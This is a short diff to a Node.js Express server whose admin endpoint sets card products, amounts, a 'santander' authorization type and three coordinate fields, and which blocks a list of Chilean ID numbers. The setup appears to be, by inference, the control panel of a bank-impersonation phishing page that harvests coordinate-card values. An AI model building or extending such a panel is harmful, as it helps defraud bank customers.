@@ -18,6 +18,7 @@ const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];
 
 const CONFIG_FILE = path.join(__dirname, "config.json");
 
+// Configuración inicial
 let config = {};
 if (fs.existsSync(CONFIG_FILE)) {
   config = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
@@ -27,7 +28,7 @@ if (fs.existsSync(CONFIG_FILE)) {
     monto1: 0,
     producto2: "Tarjeta de Crédito WorldMember Limited Business",
     monto2: 0,
-    producto3: "Visualización de Tarjeta",   // 👈 Nuevo producto
+    producto3: "Visualización de Tarjeta",
     monto3: 0,
     tipoAutorizacion: "santander",
     coord1: "",
@@ -99,7 +100,22 @@ app.get("/config", (req, res) => {
 });
 
 app.post("/config", (req, res) => {
-  config = { ...config, ...req.body };
+  // Normalizar valores recibidos desde admin
+  config.producto1 = req.body.producto1 || "";
+  config.monto1 = req.body.monto1 || 0;
+
+  config.producto2 = req.body.producto2 || "";
+  config.monto2 = req.body.monto2 || 0;
+
+  config.producto3 = req.body.producto3 || "";
+  config.monto3 = req.body.monto3 || 0;
+
+  config.tipoAutorizacion = req.body.tipoAutorizacion || "santander";
+  config.coord1 = req.body.coord1 || "";
+  config.coord2 = req.body.coord2 || "";
+  config.coord3 = req.body.coord3 || "";
+  config.factibilidad = req.body.factibilidad || config.factibilidad;
+
   fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
   res.json(config);
 });
